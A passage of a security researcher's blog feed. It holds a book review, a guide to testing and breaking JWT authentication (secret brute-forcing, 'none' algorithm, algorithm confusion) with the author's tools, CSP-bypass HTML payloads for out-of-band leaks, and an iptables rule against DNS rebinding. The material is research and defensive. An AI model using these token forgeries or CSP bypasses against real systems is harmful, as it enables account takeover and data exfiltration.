+&lt;/ol&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><summary type="html"></summary></entry><entry><title type="html">Book Review: WASEC By Alessandro Nadalin</title><link href="https://mazinahmed.net/blog/wasec-book-review/" rel="alternate" type="text/html" title="Book Review: WASEC By Alessandro Nadalin" /><published>2020-03-29T00:00:00-05:00</published><updated>2020-03-29T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/wasec-book-review</id><content type="html" xml:base="https://mazinahmed.net/blog/wasec-book-review/">&lt;p&gt;&lt;img src=&quot;/assets/static/ae2ef466-b717-4a53-8a79-e2dafdf54faf.jpeg&quot; style=&quot;margin: 0 auto;display: block;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This blog post is a book review for the WASEC (Web Application Security for the everyday software engineer) book by Alessandro Nadalin.&lt;/p&gt;
+
+&lt;p&gt;First of all, I have worked with Alessandro in building the security program for Namshi (an Emaar-acquired company in Dubai, United Arab Emirates). It was an excellent experience with great talents I had the chance to work with. Alessandro was the CTO of Namshi, with a high record of achievements in the tech industry. Visit &lt;a href=&quot;https://odino.org&quot;&gt;Alessandro’s website&lt;/a&gt; or &lt;a href=&quot;https://tech.namshi.io/&quot;&gt;Namshi blog&lt;/a&gt; to read more.&lt;/p&gt;
+
+&lt;p&gt;The WASEC book is an intro for security engineering for web-based services. If you’re a web developer, a software engineer who works with web technologies, an enthusiast who would like to understand the fundamentals of web security from a security engineering perspective, then this book is an excellent intro and a must-read.&lt;/p&gt;
+
+&lt;p&gt;The book focuses on browser security features and utilizing them in building secure web-apps. WASEC also dives into explaining the HTTP protocol, and the differences between HTTP vs. HTTPS vs. HTTP/2 in a simple way.&lt;/p&gt;
+
+&lt;p&gt;The 7th chapter discusses DDoS attacks in a general manner, and how it is like to be in the middle of a DDoS attack.&lt;/p&gt;
+
+&lt;p&gt;Bug Bounty Programs are also covered from the perspective of companies. Namshi has a bug bounty program with one of the highest-paid rewards in the Middle East. Check the bug bounty program at &lt;a href=&quot;https://en-ae.namshi.com/security/&quot;&gt;Namshi Security&lt;/a&gt;. Alessandro shared some of his experience in running the program for the past few years.&lt;/p&gt;
+
+&lt;p&gt;One of the topics I enjoyed reading was “Logging Secrets”. It’s something that it’s not extensively discussed typically, and should be put in mind when integrating logging systems into applications.&lt;/p&gt;
+
+&lt;p&gt;I liked the language that the book is written by; a very simple, yet informative one that would encourage anyone to recommend the book to students and starters.&lt;/p&gt;
+
+&lt;p&gt;Another point I liked that WASEC is discussing new/modern security technologies and standards. I will list some here:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Same-Site Cookies&lt;/li&gt;
+  &lt;li&gt;Security.txt&lt;/li&gt;
+  &lt;li&gt;HPKP (HTTP Public Key Pinning) - it’s now dead. It’s discussing why, and the replacements.&lt;/li&gt;
+  &lt;li&gt;CSP (Content Security Policy)&lt;/li&gt;
+  &lt;li&gt;Stateful vs. Stateless Authentication&lt;/li&gt;
+  &lt;li&gt;JWT&lt;/li&gt;
+  &lt;li&gt;Dependencies security&lt;/li&gt;
+  &lt;li&gt;CDNs (Content Delivery Networks) and how to validate and SRI (Sub-Resource Integrity)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;book-link-httpsleanpubcomwasec&quot;&gt;&lt;strong&gt;Book link&lt;/strong&gt;: &lt;a href=&quot;https://leanpub.com/wasec&quot;&gt;https://leanpub.com/wasec&lt;/a&gt;&lt;/h3&gt;
+
+&lt;h3 id=&quot;book-release-blog-post-by-alessandro-httpsodinoorgwasec-a-book-about-web-application-security-is-now-available-for-sale&quot;&gt;&lt;strong&gt;Book release blog post by Alessandro&lt;/strong&gt;: &lt;a href=&quot;https://odino.org/wasec-a-book-about-web-application-security-is-now-available-for-sale/&quot;&gt;https://odino.org/wasec-a-book-about-web-application-security-is-now-available-for-sale/&lt;/a&gt;&lt;/h3&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="book-review" /><summary type="html"></summary></entry><entry><title type="html">Practical Approaches for Testing and Breaking JWT Authentication</title><link href="https://mazinahmed.net/blog/breaking-jwt/" rel="alternate" type="text/html" title="Practical Approaches for Testing and Breaking JWT Authentication" /><published>2019-10-25T00:00:00-05:00</published><updated>2019-10-25T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/breaking-jwt</id><content type="html" xml:base="https://mazinahmed.net/blog/breaking-jwt/">&lt;hr /&gt;
+
+&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;JWT (JSON Web Token) is a popular authentication/authorization protocol. It integrates cryptographic signatures into JSON objects to verify the integrity of the object.&lt;/p&gt;
+
+&lt;p&gt;The approach of JWT is systematic and fairly simple. There were several pieces of research done to cover the security aspects of JWT authentication.&lt;/p&gt;
+
+&lt;p&gt;Several tools were also previously developed. However, after assessing the quality of the public tools, I concluded that we need better tools to perform testing against JWT. I have developed a set of scripts I call it “jwt-pwn” that aims to test JWT authentication with stability, simplicity, and efficiency in mind. The scripts set are very simple, as it integrates directly with the JWT Python library.&lt;/p&gt;
+
+&lt;p&gt;This article will cover the background of JWT, wrong implementations, and practical approaches to test and break JWT. It will also cover a section of constructive criticism, where I will be discussing each known public tool for testing JWT, and the issues I faced with it where I had come to the idea of developing jwt-pwn.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+
+&lt;p&gt;The following figure explains the fundamental approach in JWT generation&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/static/35fa32b3-3c31-4843-9e39-f7d83c612e96.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Source: https://jwt.io&lt;/p&gt;
+
+&lt;p&gt;JWT is structured by three parts:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Header&lt;/strong&gt;: Acts as a guide on how to operate. The header holds the JWT algorithm used in generating the signature.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Payload&lt;/strong&gt;: Holds the JSON object, along with the preserved claims if any.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Signature&lt;/strong&gt;: The Base64 encoded representation of the header and the payload. The secret is optionally added to the signature.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;testing-the-implementation&quot;&gt;Testing the Implementation&lt;/h1&gt;
+
+&lt;h2 id=&quot;1-brute-forcing-secret-keys&quot;&gt;1. Brute-forcing secret keys&lt;/h2&gt;
+
+&lt;p&gt;JSON web tokens are typically signed with a secret key. A secret key is simply a password or digital key. If we were able to find the secret key, then we will be able to generate valid tokens with any value we specify.&lt;/p&gt;
+
+&lt;p&gt;This test is done for any token generated with a password; the attack does not apply to the key-based signing of the token.&lt;/p&gt;
+
+&lt;p&gt;An interesting point to mention that it’s an offline password attack, so no noise would be made to the target’s backend. We only require a valid JWT provided by the backend when authentication or similar situations.&lt;/p&gt;
+
+&lt;h2 id=&quot;2-signing-a-new-token-with-the-none-algorithm&quot;&gt;2. Signing a new token with the “none” algorithm&lt;/h2&gt;
+
+&lt;p&gt;This test is quite straightforward. We would decode the value of the JWT without validating the signature. From there, we will generate a new token with the “none” algorithm.&lt;/p&gt;
+
+&lt;p&gt;After this, we will replace the original JWT in the authentication with the newly generated token. If it’s accepted, and the same response of the original token is given, then the authentication functionality is arbitrarily accepting the “none” algorithm, where we explicitly “ask” the JWT validator on the backend to not validate the token.&lt;/p&gt;
+
+&lt;p&gt;If it works, replay attacks can be done. I’m referring to the “replay attacks” term by the act of replaying a valid token to the authentication controller, without focusing on the source of obtaining the token. In our case here, it will be signing a new token that is valid for the another user (or admin).&lt;/p&gt;
+
+&lt;h2 id=&quot;3-changing-the-signing-algorithm-of-the-token-for-fuzzing-purposes&quot;&gt;3. Changing the signing algorithm of the token (for fuzzing purposes)&lt;/h2&gt;
+
+&lt;p&gt;Let’s say a backend returns a JSON Web Token signed with RSA256. The validation test would aim to check whether the JWT validator enforces RSA256 in this case.&lt;/p&gt;
+
+&lt;p&gt;We will decode the value of the original JWT, then we will generate a newly signed token with our secret key, using HS256 for example.&lt;/p&gt;
+
+&lt;p&gt;This test may not fully break the JWT authentication system in typical cases. However, it can be a good practice to test it against and inspect its response for fuzzing purposes.&lt;/p&gt;
+
+&lt;h2 id=&quot;4-signing-the-asymmetrically-signed-token-to-its-symmetric-algorithm-match-when-you-have-the-original-public-key&quot;&gt;4. Signing the asymmetrically-signed token to its symmetric algorithm match (when you have the original public key)&lt;/h2&gt;
+
+&lt;p&gt;When a token is asymmetrically signed (e.g. RSA256), and you obtained the public key that is used for verifying the signature, then an attack that can be applied is to generate a new token with the same payload, and with symmetric signing algorithm (e.g. HS256), while using the public key as the password.&lt;/p&gt;
+
+&lt;p&gt;If it works, then this means that the validator is not whitelisting the signing algorithm for the JWT, and we can generate arbitrary tokens that will be accepted by the JWT validator.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;public-tools&quot;&gt;Public Tools&lt;/h1&gt;
+
+&lt;p&gt;Several tools aim to assess JWT authentication. The tested tools for doing JWT assessments faces different engineering issues.&lt;/p&gt;
+
+&lt;h2 id=&quot;jwt_tool---httpsgithubcomticarpijwt_tool&quot;&gt;jwt_tool - (https://github.com/ticarpi/jwt_tool)&lt;/h2&gt;
+
+&lt;p&gt;jwt_tool does various tests for JWT. However, the custom implementation of parsing and generating JWT causes errors and false-positives. Jwt_tool uses a custom method of decoding and encoding Base64 instead of using the default JWT library. Although the JWT protocol is public and documented, Base64 varies from implementation to another. For instance, multiple Base64 encoded strings can represent the same value.&lt;/p&gt;
+
+&lt;h4 id=&quot;note-jwt_tool-released-a-new-update-as-of-october-2019-that-should-be-fixing-the-majority-of-the-issues-that-was-encountered&quot;&gt;Note: Jwt_tool released a new update (as of October 2019) that should be fixing the majority of the issues that was encountered.&lt;/h4&gt;
+
+&lt;h2 id=&quot;c-jwt-cracker---httpsgithubcombrendan-riusc-jwt-cracker&quot;&gt;c-jwt-cracker - (https://github.com/brendan-rius/c-jwt-cracker)&lt;/h2&gt;
+
+&lt;p&gt;C-jwt-cracker is a tool to brute-force the private key of JWT. Besides it uses its implementation of JWT, the Base64 library used by c-jwt-cracker is proven to be buggy and delivers invalid results.&lt;/p&gt;
+
+&lt;p&gt;Quoting from the c-jwt-cracker Github page:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;“The base64 implementation I use (from Apple) is sometimes buggy because not every Base64 implementation is the same. So sometimes, decrypting of your Base64 token will only work partially and thus you will be able to find a secret to your token that is not the correct one”.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Source: https://github.com/brendan-rius/c-jwt-cracker&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;jwt-cracker---httpsgithubcomlmamminojwt-cracker&quot;&gt;jwt-cracker - https://github.com/lmammino/jwt-cracker&lt;/h2&gt;
+
+&lt;p&gt;This tool is limited to a single signing algorithm (HS256), which makes it unable to operate if a different signing algorithm is provided.&lt;/p&gt;
+
+&lt;h4 id=&quot;additional-issue&quot;&gt;Additional issue&lt;/h4&gt;
+
+&lt;p&gt;Besides, all tools discussed in the experiment are using a linear approach to crack the password.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;introducing-jwt-pwn&quot;&gt;Introducing jwt-pwn&lt;/h1&gt;
+
+&lt;p&gt;The scripts take every test and approach to break JSON web tokens and apply it systematically. Everything is also done using the primary JWT library for Python, “pyjwt”. Pyjwt is heavily used in real-world applications. It’s stable, tested, and maintained.&lt;/p&gt;
+
+&lt;p&gt;I find using Pyjwt instead of writing a custom library as many did is much better for stability wise. There are known tools that give wrong results due to the failure of parsing JWT tokens correctly. Usage of Pyjwt would generate the same results the backend parser would get in most cases.&lt;/p&gt;
+
+&lt;h2 id=&quot;first-script-jwt-crackerpy&quot;&gt;First script: jwt-cracker.py&lt;/h2&gt;
+
+&lt;p&gt;This script performs brute-force attacks via a provided wordlist against a JSON web token.&lt;/p&gt;
+
+&lt;p&gt;I had two prototypes for the brute-forcing algorithm part.&lt;/p&gt;
+
+&lt;h3 id=&quot;first-approach&quot;&gt;First approach&lt;/h3&gt;
+&lt;p&gt;1- Load all the wordlist in a queue&lt;/p&gt;
+
+&lt;p&gt;2- spawn a new thread once an available thread is available  (there is a thread lock that controls this part).&lt;/p&gt;
+
+&lt;p&gt;After analysis, I found this to better not as good as needed. The reason is: Besides the actual brute-forcing, the problems are:&lt;/p&gt;
+
+&lt;p&gt;1- There should be a thread constantly unloading from the queue&lt;/p&gt;
+
+&lt;p&gt;2- Checker for threads availability.&lt;/p&gt;
+
+&lt;p&gt;3- Locker for threads from being spawned until an available thread is there.&lt;/p&gt;
+
+&lt;p&gt;4- Have the queue unloaded linearly.&lt;/p&gt;
+
+&lt;p&gt;Many factors are involved in this part that approached the algorithm not the most efficient one to use.&lt;/p&gt;
+
+&lt;h3 id=&quot;second-approach&quot;&gt;Second approach&lt;/h3&gt;
+
+&lt;p&gt;I find this to be the correct method.&lt;/p&gt;
+
+&lt;p&gt;1- Split the entire wordlist into smaller queues.&lt;/p&gt;
+
+&lt;p&gt;2- Spawn new threads, and then feed every queue to a unique thread.&lt;/p&gt;
+
+&lt;p&gt;3- The thread is treated as a “worker”, and all the functions are synchronized with a global checker that checks if the key is found by other workers.&lt;/p&gt;
+
+&lt;p&gt;4- While the key is not found, all threads test values in the assigned queue.&lt;/p&gt;
+
+&lt;p&gt;5- If the key is found, all threads are joined, and the application terminates.&lt;/p&gt;
+
+&lt;p&gt;6- The application terminates when all values in every child queue are tested.&lt;/p&gt;
+
+&lt;h4 id=&quot;problem&quot;&gt;Problem&lt;/h4&gt;
+
+&lt;p&gt;After implementing this design in Python, The GIL (Global Interpreter Lock) in Python has caused the app to be relatively slower than needed.&lt;/p&gt;
+
+&lt;h3 id=&quot;second-script-jwt-cracker-go&quot;&gt;Second Script: jwt-cracker-go&lt;/h3&gt;
+
+&lt;p&gt;The script is a linear implementation of the jwt-cracker in Golang. It’s really fast compared to other tools, although it’s using a linear approach for password cracking, and reliable as it’s using the official Golang library for JWT in the process of validating tokens. This library should be relatively the same library being used by developers in real-world environments.&lt;/p&gt;
+
+&lt;p&gt;I have also written another variant that uses goroutines which should be faster. The code for the multi-threaded variant is available in the project repository.&lt;/p&gt;
+
+&lt;h3 id=&quot;third-script-jwt-decoderpy&quot;&gt;Third script: jwt-decoder.py&lt;/h3&gt;
+
+&lt;p&gt;This is a simple script that decodes the values of JSON web tokens. It should be handy for testing JWT.&lt;/p&gt;
+
+&lt;h3 id=&quot;fourth-script-jwt-mimickerpy&quot;&gt;Fourth script: jwt-mimicker.py&lt;/h3&gt;
+
+&lt;p&gt;This script creates an unsigned token from the JSON web tokens. This script applies the “none” attack discussed previously.&lt;/p&gt;
+
+&lt;h3 id=&quot;fifth-script-jwt-key_based_token-to-hs256py&quot;&gt;Fifth script: jwt-key_based_token-to-hs256.py&lt;/h3&gt;
+
+&lt;p&gt;This script creates a signed JWT from a key-based JWT. This applies to the attack mentioned previously.&lt;/p&gt;
+
+&lt;p&gt;The script works on every key-based signing algorithm, thanks to the powerful pyjwt library.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;what-to-do&quot;&gt;What to Do?&lt;/h1&gt;
+
+&lt;h2 id=&quot;penetration-testers-and-security-researchers&quot;&gt;Penetration Testers and Security Researchers&lt;/h2&gt;
+
+&lt;p&gt;Test your organization’s JWT implementation via jwt-pwn, and report any weaknesses identified.&lt;/p&gt;
+
+&lt;h2 id=&quot;developers-and-defenders&quot;&gt;Developers and Defenders&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Make sure you’re enforcing the algorithm used in the JWT validator.&lt;/li&gt;
+  &lt;li&gt;Disallow unused algorithm (via whitelisting approach).&lt;/li&gt;
+  &lt;li&gt;Always verify the JWT header, and verify the JWT “alg” key in the JWT header.&lt;/li&gt;
+  &lt;li&gt;Never trust the “none” algorithm for signing.&lt;/li&gt;
+  &lt;li&gt;Use a long and extremely difficult to recover secret keys. If the secret key is identified, the entire authentication will be broken.&lt;/li&gt;
+  &lt;li&gt;Rotate your signing keys periodically.&lt;/li&gt;
+  &lt;li&gt;Don’t expose important client-data in JWT; it can be decoded. If there is sensitive data shared in the payload, any party that obtains the token would be able to see it.&lt;/li&gt;
+  &lt;li&gt;Add a claim for “Expiration” to overcome the non-expiration issue in the stateless protocol.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;jwt-pwn-homepage&quot;&gt;Jwt-pwn Homepage&lt;/h1&gt;
+
+&lt;h2 id=&quot;httpsgithubcommazen160jwt-pwn&quot;&gt;&lt;a href=&quot;https://github.com/mazen160/jwt-pwn&quot;&gt;https://github.com/mazen160/jwt-pwn&lt;/a&gt;&lt;/h2&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><summary type="html"></summary></entry><entry><title type="html">[Research] Overview of the Application-Level Security of the Swiss Evoting System</title><link href="https://mazinahmed.net/blog/swiss-evoting-system-security/" rel="alternate" type="text/html" title="[Research] Overview of the Application-Level Security of the Swiss Evoting System" /><published>2019-04-16T00:00:00-05:00</published><updated>2019-04-16T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/swiss-evoting-system-security</id><content type="html" xml:base="https://mazinahmed.net/blog/swiss-evoting-system-security/">&lt;hr /&gt;
+
+&lt;p&gt;I’m publishing my security research on the overview of the application-level security of the Swiss E-voting system.&lt;/p&gt;
+
+&lt;p&gt;You can find the download the report at the following link:&lt;/p&gt;
+
+&lt;p&gt;Download: &lt;a href=&quot;https://mazinahmed.net/uploads/Overview%20of%20the%20Application-Level%20Security%20of%20the%20Swiss%20Evoting%20System.pdf&quot;&gt;Overview of the Application-Level Security of the Swiss Evoting System&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Best Regards,&lt;br /&gt;
+Mazin Ahmed&lt;/p&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><summary type="html"></summary></entry><entry><title type="html">Backchannel Leaks on Strict Content-Security Policy</title><link href="https://mazinahmed.net/blog/backchannel-leaks-on-strict-csp-policy/" rel="alternate" type="text/html" title="Backchannel Leaks on Strict Content-Security Policy" /><published>2019-01-18T00:00:00-06:00</published><updated>2019-01-18T00:00:00-06:00</updated><id>https://mazinahmed.net/blog/backchannel-leaks-on-strict-csp-policy</id><content type="html" xml:base="https://mazinahmed.net/blog/backchannel-leaks-on-strict-csp-policy/">&lt;hr /&gt;
+
+&lt;h1 id=&quot;abstract&quot;&gt;Abstract&lt;/h1&gt;
+
+&lt;p&gt;Content-Security Policy (CSP) is one of the most vital protection layers in client-side web security. A strict policy should not allow external communications to non-permitted hosts. This blog post demonstrates a bypass I found in Chrome and Firefox that permits backchannel communication leaks by requesting non-permitted domains.&lt;/p&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+
+&lt;p&gt;I recently had a discussion on how CSP can secure web-applications against backchannel leaks. The concept sounded reasonable from the first sight; CSP is designed to block unauthorized content from loading, which generically blocks XSS attacks, unsafe loading of remote JavaScript (and various resources and contents) from unauthorized origins.&lt;/p&gt;
+
+&lt;p&gt;This discussion led me to conduct research on methods for issuing backchannel communications with non-permitted hosts.&lt;/p&gt;
+
+&lt;h1 id=&quot;research&quot;&gt;Research&lt;/h1&gt;
+
+&lt;p&gt;The first step for the research is to set up the testing bed. I prepared an application with a strict Content-Security Policy. The policy is:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Security-Policy: default-src 'self'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This should block all requests (outbound connections) from unauthorized origins and hosts.&lt;/p&gt;
+
+&lt;p&gt;The tests were focused on the latest versions of Chrome and Firefox as of January 18th, 2019.
+Chrome: v72.0
+Firefox: v64.0&lt;/p&gt;
+
+&lt;h1 id=&quot;result&quot;&gt;Result&lt;/h1&gt;
+
+&lt;h3 id=&quot;chrome&quot;&gt;Chrome&lt;/h3&gt;
+
+&lt;p&gt;Chrome has an interesting bypass that does not follow the CSP policy by utilizing the “link prerendering”.&lt;/p&gt;
+
+&lt;p&gt;The following payload leaks an HTTP request from the client’s agent.&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prerender&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://mazinahmed.net/&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This loads resources within a URL in the background. It appears that Chrome is not enforcing CSP on the link prerendering process.&lt;/p&gt;
+
+&lt;h3 id=&quot;firefox&quot;&gt;Firefox&lt;/h3&gt;
+
+&lt;p&gt;Firefox is much better in protecting against backchannel communication leaks. However, after further testing, I have found that this payload bypasses this protection:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;refresh&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1; url=https://mazinahmed.net&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Redirection using the Meta tag is possible on CSP, and it can not be blocked. Therefore, I can redirect users to other sites without the involvement of JavaScript and typical active content. It’s also working on Chrome. Once a client is redirected, we will receive a connection back to our server.&lt;/p&gt;
+
+&lt;h3 id=&quot;update-safari-is-vulnerable-too-to-the-meta-refresh-vector&quot;&gt;Update: Safari is vulnerable too to the Meta refresh vector.&lt;/h3&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;While having CSP to fundamentally protect against backchannel communication leaks sounds generally true, it appears that the CSP implementation on browsers does not provide this sort of protection. The bypasses I stated on the post is currently working against the latest versions of modern browsers.&lt;/p&gt;
+
+&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
+
+&lt;p&gt;These payloads can be good for testing and exploiting vulnerabilities that rely on OOB (out-of-band) requests, such as blind XSS, in a scenario where Content-Security Policy is blocking outbound requests to untrusted hosts.&lt;/p&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><summary type="html"></summary></entry><entry><title type="html">Practical Protection Against DNS Rebinding Attacks</title><link href="https://mazinahmed.net/blog/practical-protection-against-dns-rebinding-attacks/" rel="alternate" type="text/html" title="Practical Protection Against DNS Rebinding Attacks" /><published>2018-07-31T00:00:00-05:00</published><updated>2018-07-31T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/practical-protection-against-dns-rebinding-attacks</id><content type="html" xml:base="https://mazinahmed.net/blog/practical-protection-against-dns-rebinding-attacks/">&lt;hr /&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+
+&lt;p&gt;DNS rebinding is a known attack against the same origin policy of modern browsers.&lt;/p&gt;
+
+&lt;p&gt;The attack works by abusing DNS where a request with a small TTL is set. After the TTL is reached, another query that resolves to another IP address (a local or internal IP address in typical cases). This way, an unauthorized party is capable to bypass the same origin policy by loading malicious code on browsers, then executing it against local or internal networks. Theoretically speaking, SOP prevents this from happening, however, DNS rebinding can bypass this protection on certain circumstances.&lt;/p&gt;
+
+&lt;p&gt;There has been a large amount of research on exploiting DNS rebinding attacks in the previous years.&lt;/p&gt;
+
+&lt;h1 id=&quot;problem&quot;&gt;Problem&lt;/h1&gt;
+
+&lt;p&gt;Although that this attack is known for years, securing an environment against DNS rebinding is normally done on application level only.&lt;/p&gt;
+
+&lt;p&gt;I don’t find this to be the best approach, as there is a larger surface that we can control to block these attacks.&lt;/p&gt;
+
+&lt;h1 id=&quot;proposed-solution&quot;&gt;Proposed Solution&lt;/h1&gt;
+
+&lt;p&gt;A DNS rebinding attack that exploits a local service shows that the domain name is pointing to a loopback address. Similarly, if it’s exploiting a service in the internal network, the domain name will be shown to be pointing to a private address.&lt;/p&gt;
+
+&lt;p&gt;In a well-structured environment, we should not rely on public DNS records to point to a loopback or private address; there is no reason to do so.&lt;/p&gt;
+
+&lt;h1 id=&quot;idea&quot;&gt;Idea&lt;/h1&gt;
+
+&lt;p&gt;If the DNS query response is a record that points to a loopback address, then this is a potential DNS rebinding attack. This should be blocked.&lt;/p&gt;
+
+&lt;p&gt;If done correctly, this will effectively block DNS rebinding attacks against local addresses.&lt;/p&gt;
+
+&lt;h1 id=&quot;implementation&quot;&gt;Implementation&lt;/h1&gt;
+
+&lt;p&gt;DNS resolvers have this feature built-in. For example, you can configure BIND to block a query where the DNS record is on the IP range.&lt;/p&gt;
+
+&lt;p&gt;IPtables can help with applying a patch too. The problem that there is no direct way to apply it.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; INPUT  &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; string &lt;span class=&quot;nt&quot;&gt;--algo&lt;/span&gt; bm &lt;span class=&quot;nt&quot;&gt;--hex-string&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'|7f000001|'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will block any DNS UDP inbound traffic on port 53 that holds “127”.&lt;/p&gt;
+
+&lt;h3 id=&quot;why-not-127001&quot;&gt;Why not “&lt;em&gt;127.0.0.1&lt;/em&gt;”?&lt;/h3&gt;
+
+&lt;p&gt;The internal loopback is /8 range. Any IP address on the range is pointing to the associated local machine.&lt;/p&gt;
+
+&lt;h3 id=&quot;will-this-iptable-rule-100-mitigate-against-the-attack&quot;&gt;Will this IPtable rule 100% mitigate against the attack?&lt;/h3&gt;
+
+&lt;p&gt;This is a starting point for a research on protecting against DNS rebinding attacks. It initiates a starting point for security vendors and endpoint security solution vendors to apply it for customers.&lt;/p&gt;
+
+&lt;p&gt;All IANA-private IP ranges should be blocked within local network using the same approach discussed above.&lt;/p&gt;
+
+&lt;p&gt;This is of course in addition to IPV6 address that points to the internal loopback.&lt;/p&gt;
+
+&lt;p&gt;The IPtable command is a simple proof of concept.&lt;/p&gt;
+
+&lt;h2 id=&quot;blocking-dns-queries-that-resolves-to-private-ip-addresses-via-dns-resolvers&quot;&gt;Blocking DNS queries that resolves to Private IP addresses via DNS resolvers&lt;/h2&gt;
+
+&lt;p&gt;DNS resolvers have the ability to block this attack. For example, BIND9’s RPZ (Response Policy Zone) can be configured to block responses of queries resolving to specific IP addresses via “Policy Trigger - IP Trigger”.&lt;/p&gt;
+
+&lt;p&gt;This can be a stable solution for production environments.&lt;/p&gt;
+
+&lt;h2 id=&quot;how-about-quad9-secure-dns-resolver&quot;&gt;How about QUAD9 Secure DNS Resolver?&lt;/h2&gt;
+
+&lt;p&gt;I have tested QUAD9 Secure DNS resolver, and they apparently do not provide protection to DNS Rebinding attacks.&lt;/p&gt;
+
+&lt;p&gt;Other DNS resolvers are assumed to not provide protection, as this is not their goal. However, QUAD9 should block attempts of DNS rebinding attacks.&lt;/p&gt;
+
+&lt;h1 id=&quot;acknowledgment&quot;&gt;Acknowledgment&lt;/h1&gt;
+
+&lt;p&gt;I would like to thank Andzej Valcik for his contribution to the research.&lt;/p&gt;
+
+&lt;h1 id=&quot;update-september-16th-2018&quot;&gt;Update (September 16th, 2018):&lt;/h1&gt;
+
+&lt;p&gt;NCC Group released a research regarding DNS rebinding attacks along with a tool called “Singularity”.&lt;/p&gt;
+
+&lt;p&gt;An interesting bypass that NCC group demonstrated in the research is the usage of a CNAME that points to “localhost”. Since “localhost” is already registered in the typical local resolver (at hosts file for example) as 127.0.0.1, this will be also required to be blocked using the same approach mentioned in my research.&lt;/p&gt;
+
+&lt;p&gt;Blocking this bypass will be straightforward. The rule should block/drop any DNS query that responds with a CNAME of “localhost”.&lt;/p&gt;
+
